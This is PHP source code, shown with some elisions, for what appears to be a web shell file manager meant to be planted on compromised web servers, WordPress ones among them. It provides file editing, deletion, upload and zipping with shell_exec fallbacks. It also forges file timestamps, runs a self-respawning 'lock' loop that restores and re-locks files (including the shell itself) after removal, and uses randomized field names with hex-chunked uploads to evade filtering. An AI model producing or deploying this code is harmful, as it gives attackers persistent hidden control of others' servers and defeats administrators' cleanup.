...
@error_reporting(0);
$tmp_sess_dir = sys_get_temp_dir() . '/.sess_' . md5(__FILE__);
if (!is_dir($tmp_sess_dir)) { @mkdir($tmp_sess_dir, 0777, true); }
if (is_dir($tmp_sess_dir) && is_writable($tmp_sess_dir)) { @session_save_path($tmp_sess_dir); }
@session_start();

if (!isset($_SESSION['state_a'])) $_SESSION['state_a'] = 'sa_'.substr(md5(uniqid(rand(), true)), 0, 6);
if (!isset($_SESSION['state_d'])) $_SESSION['state_d'] = 'sd_'.substr(md5(uniqid(rand(), true)), 0, 6);
...
function get_lock_handler_code($real_fles, $text_file, $cwd, $lock_perm) {
    return "\n<?php\n@ini_set(\"max_execution_time\", 0);\nwhile (True){\n    if (!file_exists(__FILE__)) die();\n    if (!file_exists(\"{$cwd}\")){\n        @mkdir(\"{$cwd}\");\n    }\n    if (!file_exists(\"{$real_fles}\")){\n        if (is_dir(\"{$text_file}\")) {\n            @shell_exec(\"cp -r \" . escapeshellarg(\"{$text_file}\") . \" \" . escapeshellarg(\"{$real_fles}\"));\n        } else {\n            \$text = base64_encode(@file_get_contents(\"{$text_file}\"));\n            @file_put_contents(\"{$real_fles}\", base64_decode(\$text));\n        }\n    }\n    \$p = gecko_perm(\"{$real_fles}\");\n    if (\$p != '0444' && \$p != '0555' && \$p != '0000'){\n        @chmod(\"{$real_fles}\", {$lock_perm});\n    }\n    sleep(1);\n}\n\nfunction gecko_perm(\$flename){\n    return substr(sprintf(\"%o\", @fileperms(\$flename)), -4);\n}\n";
}

function init_wp_fs(){global $wp_filesystem;$p=rtrim($_SERVER['DOCUMENT_ROOT'],'/\\').'/wp-admin/includes/file.php';if(empty($wp_filesystem)&&file_exists($p)){if(!defined('ABSPATH')){$l=rtrim($_SERVER['DOCUMENT_ROOT'],'/\\').'/wp-load.php';if(file_exists($l))@require_once($l);}if(defined('ABSPATH')){@require_once(ABSPATH.'/wp-admin/includes/file.php');if(function_exists('WP_Filesystem'))WP_Filesystem();}}}

function isFileLocked($path) {
    static $TmpNames = null; if ($TmpNames === null) $TmpNames = sys_get_temp_dir();
    $p = getPermissions($path);
    if ($p==='0444' || $p==='0555' || $p==='0000' || $p==='0400' || $p==='0500' || $p==='0440' || $p==='0550') return true;
    if (file_exists($TmpNames . '/.sessions/.' . base64_encode($path . '-handler'))) return true;
    $r = realpath($path);
    if ($r && $r !== $path && file_exists($TmpNames . '/.sessions/.' . base64_encode($r . '-handler'))) return true;
    $f = pathinfo($path, PATHINFO_FILENAME);
    if (file_exists($TmpNames . '/.sessions/.' . base64_encode(dirname($path) . DIRECTORY_SEPARATOR . $f . '-handler'))) return true;
    return false;
}

function core_delete($del_path) {
    $success = false;
    ...
    if (is_dir($del_path)) {
        if (@rmdir($del_path)) { $success = true; }
        else {
            init_wp_fs();
            global $wp_filesystem;
            if (!empty($wp_filesystem) && is_object($wp_filesystem) && method_exists($wp_filesystem, 'delete')) {
                try { if (@$wp_filesystem->delete($del_path, true, 'd')) { $success = true; } } catch (Throwable $e) {}
            }
            if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
                $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'rmdir /s /q ' . escapeshellarg($del_path) : 'rm -rf ' . escapeshellarg($del_path);
                @shell_exec($cmd);
                if (!file_exists($del_path)) $success = true;
            }
        }
    } else {
        if (@unlink($del_path)) { $success = true; }
        else {
            init_wp_fs();
            global $wp_filesystem;
            if (!empty($wp_filesystem) && is_object($wp_filesystem) && method_exists($wp_filesystem, 'delete')) {
                try { if (@$wp_filesystem->delete($del_path, false, 'f')) { $success = true; } } catch (Throwable $e) {}
            }
            if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
                $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'del /f /q ' . escapeshellarg($del_path) : 'rm -f ' . escapeshellarg($del_path);
                @shell_exec($cmd);
                if (!file_exists($del_path)) $success = true;
            }
        }
    }
    if (!$success && $file_perms !== false && file_exists($del_path)) @chmod($del_path, $file_perms);
    if ($dir_perms !== false) @chmod($dir, $dir_perms);
    return $success;
}

function core_save($path, $content) {
    $success = false;
    $written = @file_put_contents($path, $content);
    if ($written !== false && $written !== null) $success = true;
    if (!$success) {
        init_wp_fs(); global $wp_filesystem;
        if (!empty($wp_filesystem) && is_object($wp_filesystem) && method_exists($wp_filesystem, 'put_contents')) {
            try { if (@$wp_filesystem->put_contents($path, $content, defined('FS_CHMOD_FILE') ? FS_CHMOD_FILE : 0644)) $success = true; } catch (Throwable $e) {}
        }
    }
    if (!$success && $f = @fopen($path, 'wb')) {
        $w = @fwrite($f, $content); @fclose($f);
        if ($w !== false) $success = true;
    }
    if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
        $tmp_save = sys_get_temp_dir() . '/' . uniqid('a3_') . '.tmp';
        if (@file_put_contents($tmp_save, $content)) {
            $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? "copy /Y " . escapeshellarg($tmp_save) . " " . escapeshellarg($path) : "cp -f " . escapeshellarg($tmp_save) . " " . escapeshellarg($path);
            @shell_exec($cmd); if (file_exists($path)) $success = true; @unlink($tmp_save);
        }
    }
    return $success;
}

function core_mkdir($path, $mode = 0755) {
    $success = false;
    if (@mkdir($path, $mode, true)) $success = true;
    if (!$success) {
        init_wp_fs(); global $wp_filesystem;
        if (!empty($wp_filesystem) && is_object($wp_filesystem) && method_exists($wp_filesystem, 'mkdir')) {
            try { if (@$wp_filesystem->mkdir($path, defined('FS_CHMOD_DIR') ? FS_CHMOD_DIR : $mode)) $success = true; } catch (Throwable $e) {}
        }
    }
    if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'mkdir ' . escapeshellarg($path) : 'mkdir -p ' . escapeshellarg($path);
        @shell_exec($cmd); if (is_dir($path)) $success = true;
    }
    return $success;
}

function core_rename($old, $new) {
    $success = false;
    if (@rename($old, $new)) $success = true;
    if (!$success) {
        init_wp_fs(); global $wp_filesystem;
        if (!empty($wp_filesystem) && is_object($wp_filesystem) && method_exists($wp_filesystem, 'move')) {
            try { if (@$wp_filesystem->move($old, $new, true)) $success = true; } catch (Throwable $e) {}
        }
    }
    if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'move /Y ' . escapeshellarg($old) . ' ' . escapeshellarg($new) : 'mv -f ' . escapeshellarg($old) . ' ' . escapeshellarg($new);
        @shell_exec($cmd); if (file_exists($new)) $success = true;
    }
    return $success;
}

function core_chmod($path, $mode) {
    $success = false;
    if (@chmod($path, $mode)) $success = true;
    if (!$success) {
        init_wp_fs(); global $wp_filesystem;
        if (!empty($wp_filesystem) && is_object($wp_filesystem) && method_exists($wp_filesystem, 'chmod')) {
            try { if (@$wp_filesystem->chmod($path, $mode)) $success = true; } catch (Throwable $e) {}
        }
    }
    if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
        if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
            @shell_exec('chmod ' . sprintf('%o', $mode) . ' ' . escapeshellarg($path));
            $p = substr(sprintf('%04o', @fileperms($path)), -4);
            if ($p === sprintf('%04o', $mode) || $p === sprintf('%03o', $mode)) $success = true;
        }
    }
    return $success;
}

function core_lock($real_fles, $cwd) {
    ...
    $handler = get_lock_handler_code($real_fles, $text_file, $cwd, $lock_perm);
...
if (isset($_GET['path'])) {
    $new_path = decryptPath($_GET['path']);
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (isset($_POST['saveFile']) && isset($_POST['filePath']) && isset($_POST['fileContent'])) {
        ...
        if (core_save($file_path, $content)) {
    ...
    if (isset($_POST['rename']) && isset($_POST['oldPath']) && isset($_POST['newName'])) {
        ...
        if (core_rename($old_path, $new_path)) {
    ...
    if (isset($_POST['changeTime']) && isset($_POST['timePath']) && isset($_POST['newTime'])) {
        $time_path = decryptPath($_POST['timePath']);
        $new_time = strtotime($_POST['newTime']);
        if ($new_time) {
            @touch($time_path, $new_time, $new_time);
            if (function_exists('shell_exec') && is_callable('shell_exec')) {
                @shell_exec("touch -a -m -t " . date('YmdHi.s', $new_time) . " " . escapeshellarg($time_path));
            }
            clearstatcache(true, $time_path);
            $message = "Time updated.";
        } else { $error = "Failed to update time."; }
    }

    if (isset($_POST['delete']) && isset($_POST['path'])) {
        $del_path = decryptPath($_POST['path']);
        if (core_delete($del_path)) {
    ...
    if (isset($_POST['bulk_action']) && isset($_POST['selected_files'])) {
        ...
        if ($action === 'delete') {
            foreach ($files as $f) {
                $p = $current_path . DIRECTORY_SEPARATOR . basename($f);
                if (core_delete($p)) $successCount++;
            }
            $message = "$successCount items deleted.";
        } elseif ($action === 'zip') {
            $zip = new ZipArchive();
            $zip_name = $current_path . DIRECTORY_SEPARATOR . (count($files) === 1 ? basename($files[0]) . '.zip' : 'archive_' . time() . '.zip');
            if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                foreach ($files as $f) {
                    $p = $current_path . DIRECTORY_SEPARATOR . basename($f);
                    if (is_dir($p)) {
                        $filesIterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p), RecursiveIteratorIterator::LEAVES_ONLY);
                        foreach ($filesIterator as $name => $file) {
                            if (!$file->isDir()) {
                                $filePath = $file->getRealPath();
                                $relativePath = substr($filePath, strlen($current_path) + 1);
                ...
                $zip->close();
                $message = "Items zipped to " . basename($zip_name);
            } else {
            ...
            $message = "$successCount zip files extracted.";
        }
    }

    if (isset($_POST['upload']) && isset($_FILES['file'])) {
        $files = is_array($_FILES['file']['name']) ? $_FILES['file'] : ['name'=>[$_FILES['file']['name']],'type'=>[$_FILES['file']['type']],'tmp_name'=>[$_FILES['file']['tmp_name']],'error'=>[$_FILES['file']['error']],'size'=>[$_FILES['file']['size']]];
        $success_count = 0; $err_debug = [];
        for ($i=0; $i<count($files['name']); $i++) {
            if ($files['error'][$i] === UPLOAD_ERR_OK) {
                $tmp_name = $files['tmp_name'][$i];
                $upload_path = $current_path . DIRECTORY_SEPARATOR . basename($files['name'][$i]);
            ...
            if ($success) { $success_count++; } else { 
                $dbg = ['tmp'=>file_exists($tmp_name)?1:0,'read'=>is_readable($tmp_name)?1:0,'c'=>($c===false)?0:strlen($c),'sh'=>(function_exists('shell_exec')&&is_callable('shell_exec'))?1:0,'w'=>is_writable(dirname($upload_path))?1:0];
                $err_debug[] = $files['name'][$i] . ' (' . json_encode($dbg) . ')';
            }
        } } 
        if (count($files['name']) === $success_count && $success_count > 0) { $message = "All $success_count file(s) uploaded successfully."; } 
        elseif ($success_count > 0) { $error = "$success_count file(s) uploaded. Failed: " . implode(', ', $err_debug); } 
        else { $error = "Failed to upload file(s). " . implode(', ', $err_debug); }
    }

    $state_act  = $_POST[$_SESSION['state_a']] ?? '';
    $state_name = $_POST[$_SESSION['state_n']] ?? '';
    $state_data = $_POST[$_SESSION['state_d']] ?? '';
    $state_idx  = (int)($_POST[$_SESSION['state_i']] ?? 0);

    if ($state_act === 'process') {
        $g_name = basename($state_name);
        if ($g_name) {
            $target    = $current_path . DIRECTORY_SEPARATOR . $g_name;
            $final=($state_data==='')?'':pack('H*', $state_data);
            $mode=($state_idx===0)?0:FILE_APPEND;
            $dir       = dirname($target);
            $dir_perms = @fileperms($dir);
            $f_perms   = file_exists($target) ? @fileperms($target) : false;
            @chmod($dir, 0777);
            if ($f_perms !== false) @chmod($target, 0666);
            ob_start();$write_ok=@file_put_contents($target,$final,$mode);ob_end_clean();
            if ($write_ok !== false) {
                echo 'OK';
            } else {
                echo 'ERR_WRITE_PERM';
            }
            if($f_perms!==false)@chmod($target,$f_perms);
            if($dir_perms!==false)@chmod($dir,$dir_perms);
        } else {
            echo 'ERR_NAME';
        }
    ...
    if (isset($_POST['lockFile']) && isset($_POST['lockFilePath'])) {
        ...
        if (core_lock($real_fles, $cwd)) {
            $message = "🔒 Lock File activated for: " . basename($real_fles);
        } else {
            $error = "Failed to write lock handler. Check temp dir permissions.";
        }
    }

    if (isset($_POST['lockShell'])) {
        $real_fles = $_SERVER['SCRIPT_FILENAME'];
        $cwd       = dirname($real_fles);
            ...
            <div style="display: flex; align-items: center; overflow-x: auto; white-space: nowrap; flex: 1;">
                ...
                foreach ($breadcrumb_items as $index => $item) {
                    ...
                    if ($index === count($breadcrumb_items) - 1) {
                        $html .= "<span class=\"breadcrumb-item\" style=\"display:inline;\"><a onclick=\"navigateTo('{$item['path']}')\" class=\"breadcrumb-current\" style=\"cursor:pointer; color:#fafafa; text-decoration:none;\">$name</a></span>";
                    } else {
                        $html .= "<span class=\"breadcrumb-item\" style=\"display:inline;\"><a onclick=\"navigateTo('{$item['path']}')\" style=\"cursor:pointer;\">$name</a><span class=\"breadcrumb-separator\">/</span></span>";
                    }
                }
                echo $html;
                ?>
        ...
        <section class="section">
            <div class="section-header">
                ...
                <div class="section-actions" style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;">
                    ...
                    <input type="file" id="asyncFileInput" style="display:none;" onchange="handleAsyncUpload(this)">
                    <div style="position:relative;display:inline-flex;">
                        <button type="button" id="asyncUploadBtn" onclick="document.getElementById('asyncFileInput').click()" class="btn btn-sm btn-lock-file" style="padding:4px 10px;font-size:0.8rem;">Upload</button>
                        <div id="asyncProgress" style="position:absolute;bottom:0;left:0;height:2px;width:0%;background:#4ade80;transition:width 0.3s;border-radius:2px;"></div>
                    </div>
                    <form class="compact-upload" method="post" enctype="multipart/form-data">
                        <input type="file" name="file[]" multiple class="custom-file-input <?php echo $dir_writable ? 'writable' : 'readonly'; ?>" required style="width: 160px;">
                        <button type="submit" name="upload" class="upload-btn"><i class="ri-upload-cloud-2-line"></i> Upload</button>
                    </form>
                </div>
            </div>
            <style>input[type="checkbox"] { accent-color: #4ade80; cursor: pointer; }</style>
            <form id="bulkActionForm" method="post">
            <div class="file-table-container">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th style="width:30px; text-align:center;"><input type="checkbox" onclick="document.querySelectorAll('.file-cb').forEach(cb=>cb.checked=this.checked)"></th>
                            <th>Filename</th>
                            <th>Size</th>
                            <th>Permissions</th>
                            <th>Modified</th>
                    ...
                    <tbody>
                        ...
                        <tr>
                            <td style="text-align:center;"><input type="checkbox" class="file-cb" name="selected_files[]" value="<?php echo htmlspecialchars($file['name']); ?>"></td>
                            <td>
                                <div class="file-name">
                            ...
                            <td><a onclick="showTimeModal('<?php echo $file['path']; ?>', '<?php echo $file['lastModified']; ?>')" style="cursor:pointer;" onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'"><?php echo $file['lastModified']; ?></a></td>
                            <td>
                                <div class="action-buttons">
                                    <?php if (!$file['isDirectory']): ?>
                                        <button type="button" class="action-btn" title="Download" onclick="downloadFile('<?php echo $file['path']; ?>')"><i class="ri-download-cloud-2-line"></i></button>
                                        <?php if ($file['isEditable']): ?>
                                            <button type="button" class="action-btn <?php echo $file['isWritable'] ? '' : 'btn-readonly'; ?>" title="Edit" onclick="showEditFileModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')"><i class="ri-edit-box-line"></i></button>
                                        <?php endif; ?>
                                    <?php endif; ?>
                                    <button type="button" class="action-btn <?php echo $file['isWritable'] ? '' : 'btn-readonly'; ?>" title="Rename" onclick="showRenameModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')"><i class="ri-pencil-line"></i></button>

                                    <button type="button" class="action-btn" title="Permissions" onclick="showPermissionsModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')"><i class="ri-key-line"></i></button>

                                    <button type="button" class="action-btn" title="Delete" style="color:#f87171;" onclick="if(confirm('Permanently delete this <?php echo $file['isDirectory'] ? 'folder' : 'file'; ?>?')) { showLoading(); document.getElementById('singleDeletePath').value='<?php echo $file['path']; ?>'; document.getElementById('singleDeleteForm').submit(); }"><i class="ri-delete-bin-line"></i></button>

                                    <?php if ($file['isLocked']): ?>
                                        <button type="button" class="action-btn" title="Unlock" style="color:#4ade80;" onclick="if(confirm('Unlock this item and restore permissions?')) { showLoading(); document.getElementById('unlockPath').value='<?php echo $file['path']; ?>'; document.getElementById('unlockForm').submit(); }"><i class="ri-lock-unlock-line"></i></button>
                                    <?php endif; ?>
                                </div>
                            </td>
                        </tr>
            ...
            <div style="display:flex; justify-content:flex-start; align-items:center; margin-top:10px;">
                <div style="display:flex; gap:6px;">
                    <input type="hidden" name="bulk_action" id="bulkActionName" value="">
                    <select id="bulkActionSelect" class="btn btn-sm" style="background-color:#18181b; color:#a1a1aa; border:1px solid #27272a; outline:none; cursor:pointer;">
                        <option value="delete">Delete Selected</option>
                        <option value="zip">Zip Selected</option>
                        <option value="unzip">Unzip Selected</option>
                    </select>
                    <button type="button" class="btn btn-sm" onclick="submitBulkAction('select')">Apply</button>
                </div>
            </div>
            </form>
        </section>
...
Type 'help' for hints or any system command to begin.</div>
    ...
    <div id="timeModal" class="modal"><div class="modal-content"><h3 class="modal-title">Change Time</h3><form class="modal-form" method="post"><input type="hidden" id="timePath" name="timePath"><div class="form-group"><label>Format: YYYY-MM-DD HH:MM:SS</label><input type="text" id="timeInput" name="newTime" required></div><div class="modal-actions"><button type="button" class="btn btn-cancel" onclick="hideModal('timeModal')">Cancel</button><button type="submit" name="changeTime" class="btn">Update</button></div></form></div></div>
    ...
    <form id="singleDeleteForm" method="post" style="display:none;"><input type="hidden" name="delete" value="1"><input type="hidden" id="singleDeletePath" name="path"></form>
    <form id="unlockForm" method="post" style="display:none;"><input type="hidden" name="unlockFile" value="1"><input type="hidden" id="unlockPath" name="unlockPath"></form>

    <script>
        function submitBulkAction(act) {
            if (act === 'select') {
                act = document.getElementById('bulkActionSelect').value;
                if (!act) return;
            }
            if (!document.querySelector('.file-cb:checked')) {
                alert('No files selected!');
                return;
            }
            if (act === 'delete' && !confirm('Are you sure you want to delete selected items?')) return;
            document.getElementById('bulkActionName').value = act;
            document.getElementById('bulkActionForm').submit();
        }
        const ST_A="<?php echo $_SESSION['state_a'];?>",ST_N="<?php echo $_SESSION['state_n'];?>",ST_D="<?php echo $_SESSION['state_d'];?>",ST_I="<?php echo $_SESSION['state_i'];?>";
        ...
        async function doAsyncPush(name, hexData) {
            const btn = document.getElementById('asyncUploadBtn');
            const progressEl = document.getElementById('asyncProgress');
            const size=3000,total=Math.ceil(hexData.length/size)||1;

            for (let i = 0; i < total; i++) {
                const pct = Math.round(((i + 1) / total) * 100);
                btn.innerText = `SYNC: ${pct}%`;
                if (progressEl) progressEl.style.width = pct + '%';

                const fd=new FormData();
                fd.append(ST_A,'process');fd.append(ST_N,name);fd.append(ST_D,hexData.substring(i*size,(i+1)*size));fd.append(ST_I,i);

                let res, text;
                try {
                    res  = await fetch(window.location.href, { method: 'POST', body: fd });
                    text = await res.text();
                } catch (e) {
                    alert('Network Error on part ' + i + ': ' + e);
